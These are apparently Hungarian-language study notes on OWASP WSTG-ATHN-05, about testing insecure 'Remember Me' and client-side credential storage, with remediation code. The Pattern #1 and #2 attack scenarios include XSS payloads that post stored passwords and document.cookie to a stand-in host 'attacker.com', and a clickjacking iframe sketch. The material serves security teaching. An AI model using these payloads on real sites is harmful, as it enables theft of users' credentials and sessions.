# WSTG-ATHN-05: Vulnerable Remember Password Tesztelése

## Mi a fejezet lényege?

Ez a fejezet arról szól, hogy a **"Remember Me"** funkció és **password manager-ek** **biztonsági kockázatokat** hordoznak, ha **credentials** vagy **long-lived tokens** **rosszul vannak tárolva** vagy **kezelve**. **Credentials browser storage-ben**, **cleartext token-ek**, vagy **never-expiring session-ök** mind **credential theft**-hez vezethetnek.

⚠️ **NE KEVERD ÖSSZE:** Ez NEM általános session management! Ez specifikusan **Remember Me** és **credential storage** - milyen **adatok** tárolódnak **client-side**-on és milyen **token-ek** használatosak **long-term authentication**-höz.

---

## Mi a cél?

**Remember Me** és **credential storage** biztonsága:
- No credentials in browser storage
- Secure token generation (not credentials)
- Token lifetime management
- Protection against clickjacking/CSRF

---

## Remember Me Concept

### Célja:
**User experience** javítása - nem kell minden alkalommal bejelentkezni.

---

### Két megközelítés:

**Approach #1 - Persistent Session:**
```
User checks "Remember Me"
→ Session token never expires (or very long expiry)
→ User stays logged in
```

**Approach #2 - Stored Credentials:**
```
User checks "Remember Me"
→ Credentials stored (localStorage/cookie)
→ Auto-login on next visit
```

---

## Vulnerability Patterns

### Pattern #1: **Credentials in LocalStorage**
### Pattern #2: **Credentials in Cookies**
### Pattern #3: **Weak Encoding (Base64)**
### Pattern #4: **Never-Expiring Tokens**
### Pattern #5: **Credentials in Browser Password Manager**

---

## Pattern #1: Credentials in LocalStorage

### Vulnerable Implementation:

**JavaScript:**
```javascript
// Remember Me checkbox checked
if (rememberMe) {
    localStorage.setItem('username', username);
    localStorage.setItem('password', password);  // CRITICAL!
}

// Auto-login on page load
window.onload = function() {
    const savedUsername = localStorage.getItem('username');
    const savedPassword = localStorage.getItem('password');
    
    if (savedUsername && savedPassword) {
        // Auto-login
        login(savedUsername, savedPassword);
    }
}
```

**Vulnerability:** Credentials **plaintext** in localStorage!

---

### Test:

```bash
# Login with "Remember Me" checked
# Then inspect localStorage

# Browser DevTools: F12 → Application → Local Storage
```

**If found:**
```
username: john.smith
password: MyPassword123
```

→ **CRITICAL!** Credentials in cleartext!

---

**Or via console:**
```javascript
console.log(localStorage.getItem('username'));
console.log(localStorage.getItem('password'));
```

---

### Attack Scenario:

**XSS Exploit:**
```javascript
// Attacker's XSS payload
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      username: localStorage.getItem('username'),
      password: localStorage.getItem('password')
    })
  });
</script>
```

→ Credentials stolen via XSS!

---

## Pattern #2: Credentials in Cookies

### Vulnerable Implementation:

```javascript
// Set cookie with credentials
if (rememberMe) {
    document.cookie = `username=${username}; max-age=2592000`;  // 30 days
    document.cookie = `password=${password}; max-age=2592000`;  // CRITICAL!
}
```

---

### Test:

```bash
# Check cookies
curl -I https://site.com

# Or DevTools: Application → Cookies
```

**If found:**
```
username=john.smith
password=MyPassword123
```

→ **CRITICAL!** Credentials in cookie!

---

### Attack Scenario:

**Network Sniffing (if not HTTPS):**
```
GET / HTTP/1.1
Cookie: username=john.smith; password=MyPassword123

→ Credentials visible in plaintext!
```

**XSS (if not HttpOnly):**
```javascript
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: document.cookie
  });
</script>
```

---

## Pattern #3: Weak Encoding (Base64)

### Vulnerable Implementation:

```javascript
// "Encode" credentials (Base64)
if (rememberMe) {
    const encoded = btoa(`${username}:${password}`);
    localStorage.setItem('credentials', encoded);
}

// Decode and auto-login
const creds = atob(localStorage.getItem('credentials'));
// → "john.smith:MyPassword123"
```

**Vulnerability:** Base64 is **encoding**, NOT **encryption**!

---

### Test:

```javascript
// Check localStorage
const encoded = localStorage.getItem('credentials');
console.log(encoded);
// → "am9obi5zbWl0aDpNeVBhc3N3b3JkMTIz"

// Decode
console.log(atob(encoded));
// → "john.smith:MyPassword123"
```

→ **CRITICAL!** Easily decoded!

---

**Command line:**
```bash
# Decode Base64
echo "am9obi5zbWl0aDpNeVBhc3N3b3JkMTIz" | base64 -d
# → john.smith:MyPassword123
```

---

## Pattern #4: Never-Expiring Tokens

### Vulnerable Implementation:

```python
# Generate remember-me token
@app.route('/login', methods=['POST'])
def login():
    # ...authentication...
    
    if request.form.get('remember_me'):
        # Generate token (NO EXPIRY!)
        token = secrets.token_urlsafe(32)
        
        # Store token → user mapping (forever!)
        remember_tokens[token] = user.id
        
        # Set cookie (30 days)
        response.set_cookie('remember_token', token, max_age=2592000)
```

**Vulnerability:** Token **never expires** server-side!

---

### Test:

```bash
# Login with Remember Me
# Get token from cookie

# Wait 30 days (or change system time)
# Token still valid!

# Even if user changes password, token still works!
```

→ **HIGH!** Stolen token = permanent access!

---

### Attack Scenario:

```
Day 1: User logs in, token generated
Day 10: Token stolen (XSS, network sniff, etc.)
Day 15: User changes password (thinking they're safe)
Day 20: Attacker uses stolen token → STILL WORKS!

→ Token never invalidated!
```

---

## Pattern #5: Browser Password Manager

### Concept:
**Browser** (Chrome, Firefox, etc.) **stores credentials** in its password manager.

---

### Vulnerability:

**Auto-fill credentials:**
```html
<form action="/login" method="POST">
  <input type="text" name="username" autocomplete="username">
  <input type="password" name="password" autocomplete="current-password">
  <button>Login</button>
</form>
```

**Browser auto-fills:**
```
username: john.smith
password: MyPassword123
```

**Without user interaction!**

---

### Attack Scenario:

**Clickjacking + Auto-fill:**
```html
<!-- Attacker's page -->
<iframe src="https://victim.com/login" style="opacity:0; position:absolute; top:0; left:0;"></iframe>

<button style="position:absolute; top:100px; left:100px;">
  Click here for FREE stuff!
</button>
```

**User clicks "FREE stuff" button:**
```
1. Browser auto-fills credentials in hidden iframe
2. Click triggers form submission
3. Credentials sent to attacker's server!
```

---

## Testing Methodology

### Test #1: **Check LocalStorage**

```javascript
// DevTools Console
for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    console.log(`${key}: ${localStorage.getItem(key)}`);
}
```

**Look for:**
- username, password, credentials
- token, auth_token, remember_token
- Base64-encoded strings

---

### Test #2: **Check Cookies**

```bash
# curl
curl -I https://site.com | grep -i set-cookie

# Or DevTools: Application → Cookies
```

**Look for:**
- Credentials in plaintext
- Base64-encoded credentials
- Long-lived tokens (max-age > 1 week)

---

### Test #3: **Check SessionStorage**

```javascript
// DevTools Console
for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    console.log(`${key}: ${sessionStorage.getItem(key)}`);
}
```

---

### Test #4: **Token Lifetime**

```bash
# 1. Login with Remember Me
# 2. Extract token
# 3. Wait (or change system time)
# 4. Use old token

curl https://site.com/dashboard \
  -H "Cookie: remember_token=old_token"

# If still works after long time:
# → Never-expiring token!
```

---

### Test #5: **Token Invalidation**

```bash
# 1. Login, get token
# 2. Change password
# 3. Use old token

curl https://site.com/dashboard \
  -H "Cookie: remember_token=old_token"

# If still works:
# → Tokens not invalidated on password change!
```

---

## Comprehensive Testing Checklist

### Browser Storage:
```
☐ Check localStorage for credentials
☐ Check sessionStorage for credentials
☐ Check cookies for credentials
☐ Look for Base64-encoded values
☐ Decode any encoded values
☐ Check if credentials = plaintext
```

---

### Token Analysis:
```
☐ Generate remember-me token
☐ Check token format (random? predictable?)
☐ Check token expiry (client-side)
☐ Check token expiry (server-side)
☐ Test old token after password change
☐ Test old token after logout
☐ Test old token after account deletion
```

---

### Attack Surface:
```
☐ Test for XSS (can steal localStorage?)
☐ Test for clickjacking (auto-fill exploit?)
☐ Test for CSRF (with auto-login?)
☐ Check HTTPS enforcement
☐ Check HttpOnly cookie flag
☐ Check Secure cookie flag
```

---

## Gyakorlati Cheat Sheet

| Teszt | Parancs |
|-------|---------|
| Check localStorage | `Object.keys(localStorage)` in console |
| Check cookies | DevTools → Application → Cookies |
| Decode Base64 | `atob(encoded)` or `echo X \| base64 -d` |
| Test token lifetime | Wait/change time, use old token |
| Test invalidation | Change password, use old token |

---

## Fontos Toolok

### Manual:
- **Browser DevTools** - F12 → Application tab
- **curl** - Cookie inspection

### Automated:
- **Burp Suite** - Intercept and analyze
- **ZAP** - Session token analysis

---

## Védelem (Remediation)

### 1. **NEVER Store Credentials Client-Side:**

**BAD:**
```javascript
localStorage.setItem('password', password);  // NO!
```

**GOOD:**
```javascript
// Only store token (not credentials)
localStorage.setItem('remember_token', token);
```

---

### 2. **Use Secure Tokens (Not Credentials):**

**Server-side token generation:**
```python
import secrets
import hashlib
from datetime import datetime, timedelta

def create_remember_token(user_id):
    # Generate random token
    token = secrets.token_urlsafe(32)
    
    # Hash token for storage
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    
    # Store: token_hash → user_id, expiry
    expires = datetime.now() + timedelta(days=30)
    
    db.execute(
        "INSERT INTO remember_tokens (token_hash, user_id, expires_at) VALUES (?, ?, ?)",
        (token_hash, user_id, expires)
    )
    
    return token  # Send to client
```

---

### 3. **Set Token Expiration:**

```python
def validate_remember_token(token):
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    
    result = db.execute(
        "SELECT user_id, expires_at FROM remember_tokens WHERE token_hash=?",
        (token_hash,)
    ).fetchone()
    
    if not result:
        return None
    
    user_id, expires_at = result
    
    # Check expiry
    if datetime.now() > expires_at:
        # Token expired
        db.execute("DELETE FROM remember_tokens WHERE token_hash=?", (token_hash,))
        return None
    
    return user_id
```

---

### 4. **Invalidate Tokens on Security Events:**

```python
def change_password(user_id, new_password):
    # Update password
    update_password(user_id, new_password)
    
    # INVALIDATE all remember-me tokens
    db.execute("DELETE FROM remember_tokens WHERE user_id=?", (user_id,))
```

---

### 5. **Secure Cookie Flags:**

```python
response.set_cookie(
    'remember_token',
    token,
    max_age=2592000,      # 30 days
    httponly=True,        # Prevent JavaScript access
    secure=True,          # HTTPS only
    samesite='Strict'     # CSRF protection
)
```

---

### 6. **Use SameSite Cookies:**

```
SameSite=Strict  → Cookie only sent to same site
SameSite=Lax     → Cookie sent on top-level navigation
SameSite=None    → Cookie sent everywhere (requires Secure)
```

---

### 7. **Token Rotation:**

```python
def validate_and_rotate_token(token):
    user_id = validate_remember_token(token)
    
    if user_id:
        # Delete old token
        old_token_hash = hashlib.sha256(token.encode()).hexdigest()
        db.execute("DELETE FROM remember_tokens WHERE token_hash=?", (old_token_hash,))
        
        # Generate new token
        new_token = create_remember_token(user_id)
        
        return user_id, new_token
    
    return None, None
```

---

## Fontos Megjegyzések

✅ **Never store credentials** client-side  
✅ **Token-based Remember Me** (not credentials)  
✅ **HttpOnly + Secure** cookie flags  
✅ **Token expiration** (30 days max)  
✅ **Invalidate on password change**  
✅ **SameSite=Strict** CSRF protection  
❌ **Credentials in localStorage** = CRITICAL!  
❌ **Base64 encoding** ≠ security!  
❌ **Never-expiring tokens** = permanent backdoor!  
⚠️ **XSS** can steal localStorage!  
⚠️ **Clickjacking** + auto-fill = credential theft!

---

**Összefoglalva:** Ez a fejezet a **Remember Me** funkció és **credential storage** teszteléséről szól. **SOHA ne tároljunk credentials**-t client-side (localStorage, cookies)! **Base64 encoding ≠ encryption** - könnyen dekódolható. **Remember Me** = **secure token** (NEM credentials), **HttpOnly + Secure + SameSite** cookie flags, **30 napos expiry**, és **invalidate** password change-nél. **Never-expiring tokens** = **permanent backdoor**! **XSS** lehet **steal localStorage**, **clickjacking** + **browser auto-fill** = **credential theft**. **Defense**: **token-based approach**, **secrets.token_urlsafe()**, **token rotation**, **proper expiry**, **invalidation** on security events!
